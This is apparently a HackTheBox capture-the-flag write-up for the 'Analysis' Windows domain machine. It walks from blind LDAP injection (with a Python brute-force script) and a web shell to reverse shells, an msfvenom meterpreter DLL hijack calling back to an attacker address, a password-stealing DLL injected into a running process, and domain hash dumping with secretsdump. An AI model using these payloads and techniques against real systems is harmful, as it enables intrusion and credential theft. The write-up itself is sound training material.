---
date: 2025-05-02
categories: [CTF, HTB]
title: "HTB - Analysis"
tags: ['gobuster', 'impacket', 'ldap', 'linux', 'nmap', 'powershell', 'privilege escalation', 'python', 'rce', 'reverse shell', 'secretsdump', 'smb', 'sqli', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Analysis - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Analysis

```bash
nmap 10.129.230.179 -A -Pn

```

![image1](../resources/6f9b6b72e8404cb4b6b569f43522bf01.png)

```bash
sudo nmap -sUV -T4 -F --version-intensity 0 10.129.230.179

```

![image2](../resources/bbbfd2fd26eb484891f99e44f8444cf6.png)

Host: **DC-ANALYSIS**

Domain: **analysis.htb**

- Add to /etc/hosts


![image3](../resources/c4ba9e0b580c4ea49a0eaf1337ad8942.png)

- Didn't find anything on the site
And no directories

**<u>Subdomain enumeration:</u>**

```bash
gobuster dns -d analysis.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r analysis.htb:53

```

![image4](../resources/c26bd0766eee43fa943263d46cb86909.png)

- Add internal.analysis.htb to /etc/hosts

![image5](../resources/e7b930126da141cab0e4a5b4ec00e6af.png)

- Dirsearch (without recursive **-r**):

`dirsearch -u http://internal.analysis.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50`



![image6](../resources/cf8f40b31f754d43a9564afae8074d7f.png)

- Good wordlist for extensions:

```bash
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt

```
- Search for extensions:

```bash
dirsearch -u http://internal.analysis.htb/users -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -r -t 50
```
![image7](../resources/5fe8c456ff854faf9392873a943e1fc2.png)

```bash
dirsearch -u http://internal.analysis.htb/employees -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -r -t 50
```

![image8](../resources/33aa2bc02c4248aabe844653c124e041.png)


![image9](../resources/cbdef65fe7ab4d6e881950c2b28f0d7b.png)

- We get  `http://internal.analysis.htb/dashboard/404.html`  but it's just a template:

![image10](../resources/b3b70035b5cc4620918e53bb67f1cb22.png)

- Login panel but we don't have credentials:

`http://internal.analysis.htb/employees/login.php`


![image11](../resources/7c1402c5de684afa9c9803d21deb22c5.png)

- Going to  `http://internal.analysis.htb/users/list.php`  - we get:

![image12](../resources/d57b674cb7a2404f92242561fc563a41.png)

- Since the list is under Users - we can assume one of the parameters could be "**name"**?


![image13](../resources/eaeca30cd7f6471894254b37a92d9edd.png)
- It's not a SQL or NoSQL database - checked with Sqlmap
More like an information table.

- LDAP injection:


![image14](../resources/1eac83d9d27045b18800f8f5274e92e4.png)

- By inserting an asterisk \* in the parameter value:


![image15](../resources/c938e141b5e143cfb228edd22b315618.png)

- We get a user **technician**

- The technician user could have his password or other information in his description

- Changing the parameters, doesn't give new information - so this could be blind LDAP injection

- Using the format:
**name=\*)(%26(objectClass=\*)(description=\*)**


![image16](../resources/e12dbc45c7294f00b43a96dc52bb3a0d.png)

- We still get technician back:

![image17](../resources/2853611d22964011953dc6e9aa0a0b36.png)

- We can bruteforce the description field - like blind SQLi
Using one char at a time:


![image18](../resources/3cea7c5603d64a85be9d3ac461c769ab.png)

- If the chosen character is incorrect we get this:

![image19](../resources/f88003c6b1d64701a880c0cec441ed8f.png)

- But if it's correct:

![image20](../resources/ca1c14fe17e34718839766b67f9b3a24.png)

- We get the technician user:

![image21](../resources/b3997b8562f94b089e83840a3fd762ed.png)

- And so keep adding one char at a time:

![image22](../resources/349be07e9e6047b199d30dcd37d9a9bd.png)

- If the character you guessed is an asterisk \* - The output will produce nothing:

![image23](../resources/83538987f64840b4808ce57defd89e10.png)


![image24](../resources/e0c110cdb7064c56a99c854610c55453.png)

So the next character needs to be guessed in order to estimate whether \* is part of the word.

(Tip: Save the asterisk \* till last, and guess everything else first)


![image25](../resources/f8b86f927f984e168eff291e2cb914ed.png)

- **<u>Blind LDAP injection script:</u>**

```python
import requests
import urllib.parse

def main():
    charset_path = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*))"
    found_chars = ""
    skip_count = 6
    add_star = True

    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)

            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue

            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue

            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)

            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)  # Reset to beginning of charset file

if __name__ == "__main__":
    main()

```

![image26](../resources/76495ee8396a4a9c9778922e88f783e3.png)

technician : **97NTtl\*4QP96Bv**

**technician@analysis.htb**

- We can now login to:

`http://internal.analysis.htb/employees/login.php`


![image27](../resources/e2fcb5575abc4ba18bdf9d505d7cf62a.png)


![image28](../resources/8ce8421169364a8e8f52d0c3bc33a774.png)

- Going to the SOC Report page, we can upload a file:
When I first uploaded the pentest monkey reverse_php, it failed.

But **I removed the leading comments and renamed it (it does check the name)**

And it uploaded:


![image29](../resources/7738db7319d44994ae51903d8a291a2e.png)

- Set up a listener:

```bash
rlwrap -cAr nc -lvnp 4445

```
Navigating to **dashboard/uploads/test.php**


![image30](../resources/c013ed3aca344424a9e0a506620876e0.png)
- I get an error and the shell fails:

![image31](../resources/e4ac453b719345beac1a0894521cd8a7.png)

- This is because the shell is for Linux

- The way I got a reverse shell was:
First I uploaded a .php file (from revshells) containing :


![image32](../resources/6a8574fc38da417f8053073a710b601c.png)

- That gave me a web input box, where I can input commands in cmd

![image33](../resources/dcac94cc2b7a44d7a5e14bcff723928f.png)

So I got a Powershell reverse shell \#2 from revshells:


![image34](../resources/0696d2c772a74ae985ffe814e96a73ea.png)

- And we got a shell

![image35](../resources/4bf3a328c17c4ed78cb2e531ab30778d.png)

- It's all in French:

![image36](../resources/4be65b971257491daaec48cb36e1c765.png)

- Upload winPEAS

![image37](../resources/ed2ac3dfcf734d56810fe48d40fec90d.png)

- Found credentials for a user:
**jdoe : 7y4Z4^\*y9Zzj**

- Test the credentials with CME:

```bash
crackmapexec smb analysis.htb -u jdoe -p 7y4Z4^*y9Zzj

```

![image38](../resources/7b0b0f8b5a4f4bb99184c3498e53c9b2.png)

- Get a shell:

```bash
evil-winrm -i analysis.htb -u jdoe -p "7y4Z4^*y9Zzj"

```

![image39](../resources/8b9d680de2a541e6b3d15859556123d7.png)

cat user.txt

**<u>Priv Esc Method 1: Snort DLL Hijacking</u>**

- Downloaded the latest winPeasAny.exe script
<https://github.com/carlospolop/PEASS-ng/releases/tag/20240303-ce06043c>

- Running that gave me:

![image40](../resources/1ea64867439b4930b400dba60552cb72.png)

- Looking through the Snort files - we get a config file:

![image41](../resources/04ec3d6ac9ee46deacb98a8135a21518.png)

- In the config file, we are particularly interested in this line:

![image42](../resources/756b7b73776942a0ad361e9c31ac754a.png)

As it says that it calls on the dll file - **sf_engine.dll**

- Now if we look in snort_dynamicengine dir - there is a file with that name in there

![image43](../resources/ba37a04f37fb4c4faf3b8840d0bfd4e0.png)

- But it isn't in the **snort_dynamicpreprocessor** dir

- We have write permissions for this folder:

```bash
icacls snort_dynamicpreprocessor

```

![image44](../resources/e56e376461014124bfbadb28a411e131.png)

- We can leverage this by uploading our own dll file into this directory and wait for it to be loaded

- Create a malicious dll:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.84 LPORT=4444 -f dll -o sf_engine.dll

```
- Start listener:

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.84; set lport 4444; exploit"

```
- Upload the malicious dll:

![image45](../resources/48aa5989df8140d2b3ed90db6c9793ce.png)

- Wait for a shell:

![image46](../resources/3c5bbd27d01545d39470d763c86e5610.png)


![image47](../resources/16c68f3f57294976910502056d2007c6.png)


![image48](../resources/f08e7de64873414dacfdfeb61783e000.png)

```bash
evil-winrm -u Administrateur -H "584d96946e4ad1ddfa4f8d7938faf91d" -i 10.129.242.35

```
**<u>Priv Esc Method 2: API Hooking - DLL Injection</u>**

- In the /private directory, we can see an encrypted file that was encrypted using BCTextEncoder

![image49](../resources/ae2bf0f8b76e46a28b1c28a1a6e37988.png)

- Download BCTextEncoder.exe.exe:

![image50](../resources/ff713f6eedc14846810160fdd4469a7b.png)

- Running the program, we can see that we need to provide a password (I opened a windows server vm to test on)


![image51](../resources/fbb445d265dc41959522e8279c3451e7.png)

- If we look at the running processes:

![image52](../resources/65b856f733c34798bfe11a4ade51b2df.png)


![image53](../resources/83fec71c78ac4368a8c0f066263af5bc.png)

We can see BCTextEncoder but also two other processes (with the same name) that gets spawned from it

- If I look at the processes on my Windows VM (because it has a GUI):

![image54](../resources/2d7e6630ecba49398e85a5b7d1c7f8d3.png)

We can see just that

- The thing is, the process ID (PID) stays the same, as long as the program is open

- But on the Victim machine (HTB box), they keep changing. So someone must keep opening it and entering the password potentially

![image55](../resources/53d5f6ef555e4a81a875dd1aa8f5a529.png)

**<u>To exploit this, we need:</u>**

- To find the API that stores the entered password and hook it
- Create a x86 malicious DLL, to will be injected into the process
- Create a x86 injector.exe that will inject the DLL file
- The process ID for TextEncode

**TL:DR - Use the precompiled files on my github <https://github.com/player23-0/BCTextEncoder_DLL_injection>**

If you want to follow the logic behind the exploit - continue:

**<u>Step 1:</u>**
- Open a Windows VM

- Download APIMonitor:

`http://www.rohitab.com/downloads`

- Upload the BCTextEncoder that we downloaded

- Open APIMonitor 32bit
Make sure all filters are ticked:


![image56](../resources/135fb9309c5f4219bb077ed0501787c0.png)

- Now go to File -\> Monitor New Process

![image57](../resources/4f991e69358b43b58298ef5bf47086fb.png)

- Now click the Pause Monitor button - this allows the BCTextEncoder to pop up

![image58](../resources/79b508f834ee4ad482e9aed68bba84ed.png)
- And then Resume again:

![image59](../resources/cc9f48a1cb4844c9ac1249bb625dfb5a.png)

- In the BCTextEncoder - Add some text and then click Encode and enter a password.
I entered Rambo12345


![image60](../resources/183ab61fde6b477681f2f685e9605b81.png)


![image61](../resources/fa1deb9c217b456abf5ee2f3df25f746.png)

- Now we need to find the right process:

![image62](../resources/ed00ab447ca44ad882cf625ff8e41402.png)

There are two TextEncoder processes.

We need to look through the threads for each, to find which one holds our password in plaintext

- Click on a thread and click inside the Summary bit and press Ctrl+F
- Now type the password you entered


![image63](../resources/cd952ce929e74c0c8858788432bda62b.png)

- We can see that the API function is **WideCharToMultiByte**


![image64](../resources/67edb927f75e43a1aba8ee645c315a3a.png)

**<u>Step 2:</u>**

Now that we know that, we need to write a DLL that can bypass this function and run our own function to save the credentials


![image65](../resources/d3972f4863e4478dbdfe39e0a0d9c9a6.png)

- We already know that the function to be bypassed is **WideCharToMultiByte**

![image66](../resources/c5880aa575f9403a8385f5bbc3c26f41.png)

- There is a code repo that already does this, we just need to modify the API function and then record the password
The repo is called RDPThief

<https://github.com/0x09AL/RdpThief/tree/master>

The API hooking rewritten code is as follows:


![image67](../resources/043192a46cec48809d31adae7e623185.png)

The above code explained:

**Function Pointer Setup:** The code creates a function pointer named TrueWideCharToMultiByte that points to the original WideCharToMultiByte function. This allows the program to call the original function even though it's going to intercept calls to it.

**Custom Function**: It then defines a new function, \_WideCharToMultiByte, which is meant to replace the original WideCharToMultiByte function. This new function does something special before calling the original function.

**Parameters Passed Through:** When \_WideCharToMultiByte is called, it takes all the parameters it received and passes them directly to the original WideCharToMultiByte function using the TrueWideCharToMultiByte pointer. This ensures that, from the perspective of the rest of the program, \_WideCharToMultiByte behaves exactly like the original WideCharToMultiByte.

**Extra Functionality:** Before passing the call to the original function, \_WideCharToMultiByte does an additional task: it calls WriteCredentials. This is where it records or logs some decrypted password information. Essentially, it's sneaking in some extra work before letting the original function do its job.

In even simpler terms: Imagine you have a friend who always goes to buy coffee from the same coffee shop. One day, you give them a new map that routes them through a park (your custom function) where you've asked them to drop off a letter (the extra task) before they continue to the coffee shop. Your friend still gets their coffee by following the original path after the detour, just like the program still calls the original WideCharToMultiByte function after doing the extra work.

- Git clone the RDPThief repo
- Open the Project in Visual Studio and modify RDPThief.cpp by using my PasswordThief.dll code:

![image68](../resources/97dba912abdf4aa18c91411e65ea9189.png)


![image69](../resources/f9571b7f017247179f10a38f75e3087a.png)

- The code is in C++, Select **Release and x86** before building

**<u>Test it</u>**

- Download Process Hacker 2
- Open Process Hacker
- Open BCTextEncoder

- You should see this:

![image70](../resources/fa7397723f294000a4e6c7113a5cee97.png)

- Now right click one of the TextEncoder processes and go to Miscellaneous -\> Inject DLL

![image71](../resources/6790f323defd4970a88289e5f5618d3a.png)

- Choose the PasswordThief.dll we made

- Now right click the process and got to Properties -\> Modules and see if the dll was loaded

![image72](../resources/39afc40ab0e74cc38d30c2060a9fff57.png)

- With my code, I added a MessageBox function just for POC , but it can be removed (line 36)

![image73](../resources/90df72799ef74aa4bb60f2a2573ab0f7.png)

We can see here that the MessageBox popped up

- The password was written to %TEMP%\data.bin

![image74](../resources/06837485fd134c718329575b955d2f5d.png)

- And decoding does the same:

![image75](../resources/81a6c419c7d740fd9ea47385e18c4759.png)

**<u>Step 3:</u>**

- This was by far the hardest part
- None of the github repos helped, neither did modules like post/windows/manage/reflective_dll_inject or PowerSploit's Invoke-dllinjection module

- This one repo did help me massively - to figure out which technique works with my DLL:
<https://github.com/milkdevil/injectAllTheThings>

- I created my own injector program

- The hardest part was figuring out what DLL injection method to use as only one worked for me:
**RtlCreateUserThread**


![image76](../resources/e0bf6e680547477c9ea4fdcc1b913158.png)

- The code for injector.exe:

![image77](../resources/f1732fa0571e460faa29392c928f7aae.png)


![image78](../resources/d044c2e9460e4ed5a37be74fd2639c50.png)

- I tested this on my Windows VM first

**<u>Step 4:</u>**

- Upload the injector.exe and the PasswordThief.dll to the Victim (HTB) machine
- Open two evil-winrm terminals
- Because the PID's keep changing - you need to be quick when injecting the DLL
- I injected it in both TextEncode processes because I didn't know which one it will be

Usage: **injector.exe \<FULL Path to DLL\> \<Process_PID\>**

(Tested on Windows 11, Server 2016, 2019)


![image79](../resources/be25ab2c0cdb45d6bc3c3b396b84b3cd.png)

- We can see that data.bin got created:

![image80](../resources/c34a33dd7c09421b926e3c6e7209c5de.png)


![image81](../resources/9da36656dc684b1b9697e623123c2819.png)

- Using the password we just got, we can decode the encoded.txt file in C:\private

- Copy the contents to BCTextEncoder and enter the password:

![image82](../resources/fb0e7d612efc40559a6773fec749fd5e.png)

- We get a password for wsmith
**DMrB8YUcC5%2**

```bash
evil-winrm -i 10.129.242.35 -u wsmith -p "DMrB8YUcC5%2"

```

![image83](../resources/5dd018d9be8f4b8ab07e7f4c81fc8b83.png)

- I uploaded SharpHound


![image84](../resources/9d536ee0ef874d31aee83e5ac4cbee10.png)

WSmith has ForceChangePassword on SOC_Analyst which has GenericAll to Domain Admins


![image85](../resources/e69a94dc1b8246e38f3770ae2572357f.png)


![image86](../resources/6b691ec1efa3445ca5272aa7850c7812.png)

- Now we can dump the hashes from the DC:

```bash
impacket-secretsdump soc_analyst:'Password123!'@10.129.242.35 -dc-ip 10.129.242.35

```

![image87](../resources/b5a189d16f0244c9847693fd9a4f14c7.png)

```bash
evil-winrm -u Administrateur -H "584d96946e4ad1ddfa4f8d7938faf91d" -i 10.129.242.35

```

![image88](../resources/60abf6af2a5b4829896c1639b1f5e677.png)